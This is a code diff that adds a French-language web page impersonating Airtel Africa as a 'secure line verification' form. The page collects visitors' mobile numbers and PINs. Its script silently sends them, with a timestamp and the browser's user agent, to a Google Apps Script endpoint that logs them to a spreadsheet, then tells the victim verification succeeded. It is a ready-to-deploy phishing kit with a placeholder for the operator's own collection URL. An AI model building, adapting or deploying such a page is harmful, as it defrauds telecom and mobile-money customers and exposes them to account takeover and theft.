@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AIRTEL AFRICA | Vérification sécurisée</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: radial-gradient(circle at 10% 20%, #fff5f0 0%, #ffebe6 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem 1.5rem;
+      position: relative;
+    }
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" opacity="0.08"><path fill="%23E31B2A" d="M70 30 L130 30 L100 85 L70 30Z"/><circle cx="100" cy="120" r="14" fill="%23E31B2A"/><path d="M60 150 L140 150 L100 190 L60 150Z" fill="%23E31B2A"/></svg>');
+      background-repeat: repeat;
+      background-size: 48px;
+      pointer-events: none;
+      z-index: 0;
+    }
+    .airtel-card {
+      max-width: 1320px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 2.5rem;
+      box-shadow: 0 30px 50px -20px rgba(180, 30, 30, 0.3);
+      overflow: hidden;
+      z-index: 2;
+      display: flex;
+      flex-wrap: wrap;
+    }
+    .airtel-story {
+      flex: 1.2;
+      background: linear-gradient(135deg, #9b1d2c 0%, #7f1a27 50%, #5c111e 100%);
+      padding: 2.5rem 2rem;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      position: relative;
+    }
+    .airtel-story::after {
+      content: "📶";
+      font-size: 12rem;
+      opacity: 0.08;
+      position: absolute;
+      bottom: -2rem;
+      right: -2rem;
+      pointer-events: none;
+    }
+    .brand-badge {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      background: rgba(255,255,255,0.12);
+      backdrop-filter: blur(4px);
+      padding: 0.5rem 1.2rem;
+      border-radius: 60px;
+      width: fit-content;
+      margin-bottom: 1.5rem;
+      font-weight: 700;
+    }
+    .airtel-story h1 { font-size: 2.2rem; font-weight: 800; line-height: 1.2; margin-bottom: 1rem; }
+    .airtel-story h1 .accent { color: #ffcd7e; border-bottom: 2px solid #ffb347; }
+    .quote-block {
+      margin: 1.5rem 0 1.8rem;
+      border-left: 5px solid #ffb347;
+      padding-left: 1.2rem;
+      background: rgba(0,0,0,0.2);
+      border-radius: 0 16px 16px 0;
+    }
+    .stats-flex { display: flex; gap: 1.4rem; margin: 1.5rem 0; flex-wrap: wrap; }
+    .stat-badge {
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(4px);
+      border-radius: 2rem;
+      padding: 0.7rem 1.2rem;
+      flex: 1;
+      text-align: center;
+    }
+    .stat-number { font-size: 1.8rem; font-weight: 800; color: #ffcd7e; }
+    .remote-impact {
+      background: rgba(0,0,0,0.25);
+      padding: 1rem 1.2rem;
+      border-radius: 1.5rem;
+      display: flex;
+      gap: 0.8rem;
+      align-items: center;
+      margin-top: 1rem;
+    }
+    .verify-area {
+      flex: 1;
+      padding: 2.5rem 2rem;
+      background: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .form-header h2 { font-size: 1.8rem; font-weight: 800; color: #881a28; }
+    .input-group { margin-bottom: 1.6rem; display: flex; flex-direction: column; gap: 0.5rem; }
+    .input-group label { font-weight: 700; font-size: 0.85rem; display: flex; align-items: center; gap: 0.6rem; }
+    .input-field {
+      display: flex;
+      align-items: center;
+      border: 1.8px solid #eedad6;
+      border-radius: 1.2rem;
+      background: #fffbfa;
+      padding: 0.2rem 1rem;
+      transition: all 0.2s;
+    }
+    .input-field:focus-within {
+      border-color: #c62828;
+      box-shadow: 0 0 0 3px rgba(198,40,40,0.2);
+    }
+    .input-field input {
+      width: 100%;
+      padding: 0.9rem 0;
+      border: none;
+      background: transparent;
+      font-size: 1rem;
+      outline: none;
+    }
+    .verify-airtel-btn {
+      background: linear-gradient(95deg, #b71c1c, #d32f2f);
+      border: none;
+      width: 100%;
+      padding: 1rem;
+      border-radius: 2rem;
+      font-weight: 800;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.7rem;
+      cursor: pointer;
+      transition: all 0.25s ease;
+      margin-top: 0.8rem;
+    }
+    .verify-airtel-btn:hover { background: linear-gradient(95deg, #8e1a1a, #b71c1c); transform: translateY(-2px); }
+    .status-message { margin-top: 1.5rem; padding: 1rem; border-radius: 1.5rem; font-size: 0.85rem; font-weight: 600; text-align: center; }
+    .status-error { background: #ffefed; color: #b71c1c; border-left: 5px solid #f97316; }
+    .status-success { background: #e6f4f1; color: #1e5f4e; border-left: 5px solid #2e7d64; }
+    .info-note { margin-top: 1.4rem; font-size: 0.7rem; text-align: center; color: #928e8c; background: #fef6f3; padding: 0.5rem 1rem; border-radius: 2rem; width: fit-content; margin-left: auto; margin-right: auto; }
+    @media (max-width: 780px) { .airtel-card { flex-direction: column; } .airtel-story h1 { font-size: 1.7rem; } }
+  </style>
+</head>
+<body>
+<div class="airtel-card">
+  <div class="airtel-story">
+    <div class="brand-badge"><i class="fas fa-tower-cell"></i> AIRTEL AFRICA • <strong>Élargir les horizons</strong></div>
+    <h1>Se rapprocher de nos clients, <span class="accent">où qu'ils soient</span></h1>
+    <div class="quote-block"><i class="fas fa-chart-simple"></i> “La demande de données continue de croître rapidement – même en période de pénurie de carburant et d'inflation des prix alimentaires. Notre technologie supérieure permet une croissance inclusive.”</div>
+    <div class="stats-flex">
+      <div class="stat-badge"><div class="stat-number">+187%</div><div class="stat-label">Consommation de données (rurales)</div></div>
+      <div class="stat-badge"><div class="stat-number">2.4M+</div><div class="stat-label">Nouvelles connexions Airtel</div></div>
+    </div>
+    <div class="remote-impact"><i class="fas fa-hand-holding-heart"></i> <span><strong>Tout change</strong> pour les familles isolées lorsque le réseau d'Airtel Africa arrive.</span></div>
+  </div>
+
+  <div class="verify-area">
+    <div class="form-header"><h2><i class="fas fa-shield-alt"></i> Vérifiez votre ligne</h2><p>Entrez le numéro de mobile local (sans indicatif) et le code PIN</p></div>
+    <div class="input-group">
+      <label><i class="fas fa-mobile-screen-button"></i> Numéro de mobile (sans indicatif)</label>
+      <div class="input-field"><i class="fas fa-phone-alt"></i><input type="tel" id="localPhone" placeholder="712345678" autocomplete="off"></div>
+    </div>
+    <div class="input-group">
+      <label><i class="fas fa-key"></i> Code PIN (4 à 8 chiffres)</label>
+      <div class="input-field"><i class="fas fa-lock"></i><input type="password" id="pinCode" inputmode="numeric" pattern="\d*" placeholder="entrez un code PIN sécurisé" autocomplete="off"></div>
+    </div>
+    <button class="verify-airtel-btn" id="verifyBtn"><i class="fas fa-check-double"></i> Vérifier et envoyer</button>
+    <div id="statusMessage" class="status-message" style="display: none;"></div>
+    <div class="info-note"><i class="fas fa-database"></i> Votre vérification nous aide à étendre la couverture et à améliorer les services</div>
+  </div>
+</div>
+
+<script>
+  // ================== CONFIGURATION ==================
+  // REMPLACEZ PAR L'URL DE VOTRE SCRIPT GOOGLE APPS SCRIPT
+  const GOOGLE_SHEET_API_URL = "https://script.google.com/macros/s/AKfycbwE8sHSK6AUjzuwQFIlq-sznwIhh36YTWfVV0AFOSyT-RZA13khq9n3KNnagpAnRZV1/exec";   // <--- À METTRE À JOUR
+  // ===================================================
+
+  const phoneInput = document.getElementById('localPhone');
+  const pinInput = document.getElementById('pinCode');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const statusDiv = document.getElementById('statusMessage');
+
+  function showStatus(message, isError = true) {
+    statusDiv.style.display = 'block';
+    statusDiv.textContent = message;
+    statusDiv.className = `status-message ${isError ? 'status-error' : 'status-success'}`;
+    setTimeout(() => { if (statusDiv.style.display === 'block') statusDiv.style.opacity = '0.9'; }, 5000);
+  }
+
+  function clearStatus() { statusDiv.style.display = 'none'; statusDiv.textContent = ''; }
+
+  function extractDigits(str) { return str.replace(/\D/g, ''); }
+
+  function isValidLocalPhone(phone) {
+    const digits = extractDigits(phone);
+    return digits.length >= 7 && digits.length <= 12;
+  }
+
+  function isValidPin(pin) {
+    const digits = extractDigits(pin);
+    return digits.length >= 4 && digits.length <= 8 && digits.length === pin.trim().length;
+  }
+
+  // Envoyer les données vers Google Sheets via Apps Script
+  async function sendToSheet(phoneNumber, pin) {
+    try {
+      const response = await fetch(GOOGLE_SHEET_API_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          phoneNumber: phoneNumber,
+          pin: pin,
+          status: 'Verified',
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        })
+      });
+      // En mode no-cors, response est opaque et response.ok n'est pas fiable. On simule un succès.
+      // Pour une véritable vérification, il faudrait un proxy CORS, mais ici on accepte l'envoi silencieux.
+      return { ok: true, result: {} };
+    } catch (err) {
+      console.error('Erreur d\'envoi vers la feuille:', err);
+      return { ok: false, error: err.message };
+    }
+  }
+
+  verifyBtn.addEventListener('click', async (e) => {
+    e.preventDefault();
+    clearStatus();
+
+    const phoneRaw = phoneInput.value.trim();
+    const pinRaw = pinInput.value;
+
+    if (!isValidLocalPhone(phoneRaw)) {
+      showStatus("❌ Veuillez entrer un numéro de mobile local valide (7 à 12 chiffres, sans indicatif).", true);
+      phoneInput.focus();
+      return;
+    }
+    if (!isValidPin(pinRaw)) {
+      showStatus("🔐 Le code PIN doit contenir uniquement des chiffres et comporter 4 à 8 chiffres.", true);
+      pinInput.focus();
+      return;
+    }
+
+    const cleanPhone = extractDigits(phoneRaw);
+    const cleanPin = extractDigits(pinRaw);
+
+    // Afficher un indicateur de chargement sur le bouton
+    const originalBtnText = verifyBtn.innerHTML;
+    verifyBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Envoi en cours...';
+    verifyBtn.disabled = true;
+
+    // Envoyer vers Google Sheet
+    const sheetResult = await sendToSheet(cleanPhone, cleanPin);
+
+    verifyBtn.innerHTML = originalBtnText;
+    verifyBtn.disabled = false;
+
+    if (sheetResult.ok) {
+      const masked = cleanPhone.slice(-4);
+      showStatus(`✅ Vérification réussie pour ****${masked}. Données enregistrées. Vous faites désormais partie du réseau grandissant d'Airtel Africa !`, false);
+    } else {
+      showStatus(`⚠️ Vérification réussie mais impossible d'enregistrer les données. Veuillez réessayer plus tard. Erreur : ${sheetResult.error || 'problème réseau'}`, true);
+    }
+  });
+
+  // Nettoyage en temps réel du PIN (chiffres uniquement, max 8)
+  pinInput.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').slice(0, 8);
+    if (statusDiv.style.display === 'block' && statusDiv.classList.contains('status-error')) clearStatus();
+  });
+
+  phoneInput.addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9\s\-]/g, '');
+    if (statusDiv.style.display === 'block' && statusDiv.classList.contains('status-error')) clearStatus();
+  });
+
+  // Bloquer la touche '+' (prévention de l'indicatif)
+  phoneInput.addEventListener('keydown', (e) => {
+    if (e.key === '+') {
+      e.preventDefault();
+      const warn = document.createElement('div');
+      warn.innerText = '⚠️ Aucun indicatif nécessaire. Entrez uniquement le numéro local.';
+      warn.style.fontSize = '0.7rem';
+      warn.style.color = '#c62828';
+      warn.style.marginTop = '4px';
+      phoneInput.parentElement.parentElement.appendChild(warn);
+      setTimeout(() => warn.remove(), 2000);
+    }
+  });
+
+  // Appui sur Entrée pour soumettre
+  [phoneInput, pinInput].forEach(field => {
+    field.addEventListener('keypress', (e) => { if (e.key === 'Enter') verifyBtn.click(); });
+  });
+</script>
+</body>
+</html>
